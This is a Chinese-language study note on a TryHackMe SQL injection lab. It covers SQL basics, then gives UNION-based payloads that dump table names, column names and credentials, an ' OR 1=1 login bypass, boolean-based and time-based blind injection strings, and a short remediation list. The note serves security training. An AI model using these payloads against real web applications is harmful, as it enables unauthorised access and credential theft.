---
title: SQL_Injection
date: 2024-05-21 13:12:23
updated: 2026-04-13 14:03:41
tags:
  - 打靶
  - TryHackMe
  - Jr_Penetration_Tester
  - Introduction_to_Web_Hacking
---
# What is a Database

数据库由 DBMS 控制，DBMS 是 Database Management System 的首字母缩写。  
DBMS分为两个阵营：关系型和非关系型;本会议室的重点将放在关系数据库上;  
你会遇到的一些常见的是MySQL，Microsoft SQL Server，Access，PostgreSQL和SQLite。

**关系型数据库与非关系型数据库：**  
关系数据库将信息存储在表中，并且表之间通常共享信息;它们使用列来指定和定义要存储的数据，并使用行来实际存储数据。这些表通常包含一个具有唯一 ID（主键）的列，然后在其他表中使用它来引用它并导致表之间的关系，因此称为关系数据库。  
另一方面，非关系数据库（有时称为 NoSQL）是不使用表、列和行来存储数据的任何类型的数据库。不需要构造特定的数据库布局，因此每行数据可以包含不同的信息，从而比关系数据库具有更大的灵活性。 这种类型的一些流行数据库是 MongoDB、Cassandra 和 ElasticSearch。

# What is SQL

```sql
#SELECT
select * from users;
select username,password from users;
select * from users LIMIT 1;//第一个数字告诉数据库您希望跳过多少个结果，第二个数字告诉数据库要返回多少行。
select * from users where username='admin';
select * from users where username != 'admin';
select * from users where username='admin' or username='jon';
select * from users where username='admin' and password='p4ssword';
select * from users where username like 'a%';//这将返回用户名以字母 a 开头的任何行。
select * from users where username like '%n';//这将返回用户名以字母 n 结尾的任何行。
select * from users where username like '%mi%';//这将返回用户名包含字符 mi 的任何行。
#UNION
SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;//从两个表中收集结果并将它们放入一个结果集中
#INSERT
insert into users (username,password) values ('bob','password123');//INSERT 语句告诉数据库我们希望在表中插入一行新的数据。“into users”告诉数据库我们希望将数据插入到哪个表中，“（username，password）”提供我们为其提供数据的列，然后“values （'bob'，'password'）;”提供先前指定列的数据。
#UPDATE
update users SET username='root',password='pass123' where username='admin';
#DELETE
delete from users where username='martin';
delete from users;
```

# What is SQL Injection

# In-Band SQLi

```sql
0 UNION SELECT 1,2,3
0 UNION SELECT 1,2,database()
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

# **Blind SQLi**

```sql
因为 1=1 是一个 true 语句，并且我们使用了 OR 运算符，所以这始终会导致查询返回为 true，
这满足 Web 应用程序逻辑，即数据库找到了有效的用户名/密码组合，并且应该允许访问。
select * from users where username='' and password='' OR 1=1;
' OR 1=1;--
```

# Blind SQLi - Boolean Based

浏览器正文包含 {“taken”：true}。此 API 端点复制了许多注册表单上的常见功能，该功能检查用户名是否已注册，以提示用户选择其他用户名。由于 taken 值设置为 true，因此我们可以假设用户名 admin 已注册。我们可以通过将模拟浏览器地址栏中的用户名从 admin 更改为 admin123 来确认这一点，按回车键后，您会看到所取的值现在已更改为 false

select \* from users where username = '%username%' LIMIT 1;

```sql
admin123' UNION SELECT 1,2,3;-- 
admin123' UNION SELECT 1,2,3 where database() like '%';--
admin123' UNION SELECT 1,2,3 where database() like 's%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
admin123' UNION SELECT 1,2,3 from users where username like 'a%
admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%
//循环浏览所有字符，您会发现密码是 3845。
```

# **Time-Based**

基于时间的盲 SQL 注入与上述基于布尔值的 SQL 注入非常相似，因为发送了相同的请求，但这次没有视觉指示您的查询是错还是对。相反，正确查询的指示器基于查询完成所需的时间。此时间延迟是使用内置方法（如 SLEEP（x） 和 UNION 语句）引入的。SLEEP（） 方法只有在成功的 UNION SELECT 语句时才会执行

```sql
admin123' UNION SELECT SLEEP(5);--
如果响应时间没有暂停，则我们知道查询不成功，因此与之前的任务一样，我们添加另一列：
admin123' UNION SELECT SLEEP(5),2;-- //Request Time: 5.001,确认 UNION 语句已成功执行，并且有两列。
admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```

# Out-of-Band SQLi

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1716300092099-1c820d9d-0357-4b63-a263-5225363f5e63.png)

# Remediation **修复**

**预准备语句（带参数化查询）**

**Input Validation: 输入验证**

**Escaping User Input: 转义用户输入**